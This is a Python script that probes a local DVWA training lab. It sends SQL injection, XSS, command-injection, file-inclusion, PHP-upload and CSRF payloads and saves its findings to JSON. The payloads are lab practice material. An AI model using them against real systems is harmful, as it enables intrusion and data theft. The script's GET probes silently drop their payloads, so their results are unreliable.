#!/usr/bin/env python3
"""
Systematic probe of all DVWA vulnerability classes.
Uses curl-style approach to maintain session and probe each endpoint.
"""
import subprocess, re, time, json, sys

BASE = "http://127.0.0.1:8080"
COOKIE_FILE = "/tmp/dvwa_cookies.txt"

def curl(method="GET", url="", data=None, referer=None, output=False):
    cmd = ["curl", "-s", "-b", COOKIE_FILE, "-c", COOKIE_FILE]
    if method == "POST":
        cmd.extend(["-d", data, "-X", "POST"])
    if referer:
        cmd.extend(["-e", referer])
    cmd.append(url)
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    return result.stdout

def login():
    # Get token
    resp = curl("GET", f"{BASE}/login.php")
    m = re.search(r"value='([^']+)'", resp)
    if m:
        token = m.group(1)
    else:
        # try different pattern
        m = re.search(r'name=\'user_token\' value=\'([^\']+)\'', resp)
        token = m.group(1) if m else ""
    
    print(f"[*] Login token: {token}")
    
    # Login
    resp = curl("POST", f"{BASE}/login.php", 
                data=f"username=admin&password=password&user_token={token}&Login=Login",
                referer=f"{BASE}/login.php")
    
    if "logged in" in resp.lower() or "Welcome" in resp:
        print("[+] Login successful!")
        return True
    else:
        print("[-] Login may have failed")
        print(resp[:500])
        return False

def probe_sqli():
    print("\n=== SQL Injection (sqli) ===")
    # Basic sqli probe
    payloads = [
        "1' OR '1'='1",
        "1' OR 1=1-- -",
        "1' UNION SELECT 1,2-- -",
        "1' UNION SELECT user(),database()-- -",
        "1' AND 1=1-- -",
        "\" OR 1=1-- -",
    ]
    for p in payloads:
        resp = curl("GET", f"{BASE}/vulnerabilities/sqli/", data=f"id={p}&Submit=Submit")
        if "First name" in resp and ("Surname" in resp or "admin" in resp.lower()):
            print(f"[!] SQL Injection found with payload: {p}")
            # Extract result
            lines = resp.split('\n')
            for i, line in enumerate(lines):
                if 'First name' in line or 'Surname' in line:
                    print(f"  -> {line.strip()}")
            return {"title": "SQL Injection in /vulnerabilities/sqli/", "payload": p, "proof": resp[:500]}
        if "mysql" in resp.lower() and "error" in resp.lower():
            print(f"[*] SQL error with payload: {p}")
    print("[-] No SQL injection detected at low security")
    return None

def probe_sqli_blind():
    print("\n=== SQL Injection Blind (sqli_blind) ===")
    payloads = [
        "1' AND 1=1-- -",
        "1' AND 1=2-- -",
        "1' OR '1'='1",
    ]
    for p in payloads:
        resp = curl("GET", f"{BASE}/vulnerabilities/sqli_blind/", data=f"id={p}&Submit=Submit")
        if "exists" in resp.lower() or "User ID exists" in resp:
            print(f"[!] Blind SQLi possible with payload: {p}")
            return {"title": "Blind SQL Injection in /vulnerabilities/sqli_blind/", "payload": p, "proof": resp[:500]}
    print("[-] No blind SQL injection detected")
    return None

def probe_xss_r():
    print("\n=== XSS Reflected (xss_r) ===")
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
    ]
    for p in payloads:
        resp = curl("GET", f"{BASE}/vulnerabilities/xss_r/", data=f"name={p}")
        if p in resp:
            print(f"[!] Reflected XSS found with payload: {p}")
            return {"title": "Reflected XSS in /vulnerabilities/xss_r/", "payload": p, "proof": resp[:500]}
    print("[-] No reflected XSS detected")
    return None

def probe_xss_s():
    print("\n=== XSS Stored (xss_s) ===")
    # We need to POST the payload
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
    ]
    for p in payloads:
        # First submit
        resp = curl("POST", f"{BASE}/vulnerabilities/xss_s/", data=f"txtName=test&mtxMessage={p}&btnSign=Sign+Guestbook")
        # Then read the guestbook
        resp2 = curl("GET", f"{BASE}/vulnerabilities/xss_s/")
        if p in resp2:
            print(f"[!] Stored XSS found with payload: {p}")
            return {"title": "Stored XSS in /vulnerabilities/xss_s/", "payload": p, "proof": resp2[:500]}
    print("[-] No stored XSS detected")
    return None

def probe_xss_d():
    print("\n=== XSS DOM (xss_d) ===")
    payloads = [
        "<script>alert(1)</script>",
        "default=<script>alert(1)</script>",
    ]
    for p in payloads:
        resp = curl("GET", f"{BASE}/vulnerabilities/xss_d/", data=f"default={p}")
        if "alert(1)" in resp or p.split("=")[-1] in resp if "=" in p else p in resp:
            print(f"[!] DOM XSS possible with payload: {p}")
            # Check if reflected
            if p in resp:
                print(f"  -> Payload reflected in response")
    print("[-] Checking DOM XSS via browser...")
    return None

def probe_exec():
    print("\n=== Command Execution (exec) ===")
    payloads = [
        "127.0.0.1",
        "127.0.0.1; id",
        "127.0.0.1 | id",
        "127.0.0.1 && id",
        "127.0.0.1 || id",
        "127.0.0.1`id`",
        "127.0.0.1$(id)",
    ]
    for p in payloads:
        resp = curl("GET", f"{BASE}/vulnerabilities/exec/", data=f"ip={p}&Submit=Submit")
        if "uid=" in resp and "gid=" in resp:
            print(f"[!] Command Execution found with payload: {p}")
            # Extract uid line
            for line in resp.split('\n'):
                if 'uid=' in line:
                    print(f"  -> {line.strip()}")
            return {"title": "Command Execution in /vulnerabilities/exec/", "payload": p, "proof": resp[:500]}
        if "www-data" in resp:
            print(f"[!] Command output contains www-data")
    print("[-] No command execution detected")
    return None

def probe_fi():
    print("\n=== File Inclusion (fi) ===")
    payloads = [
        "/etc/passwd",
        "../../../../etc/passwd",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]
    for p in payloads:
        resp = curl("GET", f"{BASE}/vulnerabilities/fi/", data=f"page={p}")
        if "root:" in resp or "www-data" in resp:
            print(f"[!] File Inclusion found with payload: {p}")
            return {"title": "File Inclusion in /vulnerabilities/fi/", "payload": p, "proof": resp[:500]}
    # Check if allow_url_include is disabled
    print("[-] File inclusion may be limited (allow_url_include=Disabled)")
    return None

def probe_upload():
    print("\n=== File Upload (upload) ===")
    # Test with a simple PHP file
    # Create test file
    import os
    os.makedirs("/tmp/upload_test", exist_ok=True)
    with open("/tmp/upload_test/test.php", "w") as f:
        f.write("<?php phpinfo(); ?>")
    
    # Upload using curl
    cmd = ["curl", "-s", "-b", COOKIE_FILE, "-c", COOKIE_FILE, 
           "-F", "MAX_FILE_SIZE=100000", 
           "-F", "uploaded=@/tmp/upload_test/test.php", 
           "-F", "Upload=Upload",
           f"{BASE}/vulnerabilities/upload/"]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
    resp = result.stdout
    
    if "succesfully" in resp.lower() or "uploaded" in resp.lower():
        print(f"[!] File upload successful!")
        return {"title": "Unrestricted File Upload in /vulnerabilities/upload/", "proof": resp[:500]}
    print("[-] File upload appears restricted")
    return None

def probe_weak_id():
    print("\n=== Weak Session IDs (weak_id) ===")
    ids = []
    for i in range(5):
        resp = curl("GET", f"{BASE}/vulnerabilities/weak_id/")
        # Look for dvwaSession cookie
        m = re.search(r'dvwaSession=(\d+)', resp)
        if m:
            ids.append(m.group(1))
        # Also check Set-Cookie header via curl verbose
        time.sleep(0.1)
    print(f"[*] Session IDs generated: {ids}")
    if len(set(ids)) >= 3 and all(id.isdigit() for id in ids):
        print(f"[!] Sequential/weak session IDs detected: {ids}")
        return {"title": "Weak Sequential Session IDs in /vulnerabilities/weak_id/", "ids": ids, "proof": f"Session IDs: {ids}"}
    print("[-] No weak IDs detected in this check")
    return None

def probe_brute():
    print("\n=== Brute Force (brute) ===")
    # Test with a simple login attempt
    resp = curl("GET", f"{BASE}/vulnerabilities/brute/", data="username=admin&password=wrong&Login=Login")
    if "Login failed" in resp or "USER" in resp.upper() and "PASSWORD" in resp.upper():
        print("[*] Brute force page accessible")
        return {"title": "Brute Force Endpoint Accessible", "proof": resp[:500]}
    return None

def probe_javascript():
    print("\n=== JavaScript (javascript) ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/javascript/")
    if "token" in resp.lower() or "success" in resp.lower():
        print("[*] JavaScript page accessible")
        # Try to find the success condition
        return {"title": "JavaScript Endpoint Accessible", "proof": resp[:500]}
    return None

def probe_csp():
    print("\n=== CSP (csp) ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/csp/")
    # Check Content-Security-Policy header
    print("[*] CSP page accessible")
    # Try to bypass CSP
    return {"title": "CSP Endpoint Accessible", "proof": resp[:500]}

def probe_captcha():
    print("\n=== CAPTCHA (captcha) ===")
    resp = curl("GET", f"{BASE}/vulnerabilities/captcha/")
    if "recaptcha" in resp.lower() or "captcha" in resp.lower() or "reCAPTCHA" in resp:
        print("[*] CAPTCHA page accessible")
        # Check if reCAPTCHA keys are missing
        if "Missing" in resp:
            print("[!] reCAPTCHA key is missing - CAPTCHA bypass possible")
            return {"title": "CAPTCHA Bypass - Missing reCAPTCHA Keys", "proof": resp[:500]}
        return {"title": "CAPTCHA Endpoint Accessible", "proof": resp[:500]}
    return None

def probe_csrf():
    print("\n=== CSRF (csrf) ===")
    # Test password change via GET (low security)
    resp = curl("GET", f"{BASE}/vulnerabilities/csrf/", data="password_new=test123&password_conf=test123&Change=Change")
    if "Password Changed" in resp or "password changed" in resp.lower():
        print(f"[!] CSRF password change via GET works!")
        return {"title": "CSRF on Password Change", "proof": resp[:500]}
    print("[-] CSRF test inconclusive")
    return None

# Main
if __name__ == "__main__":
    print("[*] Logging in...")
    if not login():
        print("[-] Login failed, trying again with different approach")
        # Try again
        if not login():
            print("[-] Cannot login, exiting")
            sys.exit(1)
    
    print("[*] Setting security level to low...")
    resp = curl("GET", f"{BASE}/security.php")
    m = re.search(r"value='([^']+)'", resp)
    token2 = m.group(1) if m else ""
    curl("POST", f"{BASE}/security.php", data=f"security=low&seclev_submit=Submit&user_token={token2}")
    
    results = {}
    
    results['sqli'] = probe_sqli()
    results['sqli_blind'] = probe_sqli_blind()
    results['xss_r'] = probe_xss_r()
    results['xss_s'] = probe_xss_s()
    results['xss_d'] = probe_xss_d()
    results['exec'] = probe_exec()
    results['fi'] = probe_fi()
    results['upload'] = probe_upload()
    results['weak_id'] = probe_weak_id()
    results['brute'] = probe_brute()
    results['javascript'] = probe_javascript()
    results['csp'] = probe_csp()
    results['captcha'] = probe_captcha()
    results['csrf'] = probe_csrf()
    
    print("\n\n=== RESULTS SUMMARY ===")
    for k, v in results.items():
        if v:
            print(f"[+] {k}: FOUND - {v.get('title', 'N/A')}")
        else:
            print(f"[-] {k}: Not found")
    
    # Save results to JSON
    with open("/tmp/probe_results.json", "w") as f:
        json.dump(results, f, indent=2, default=str)
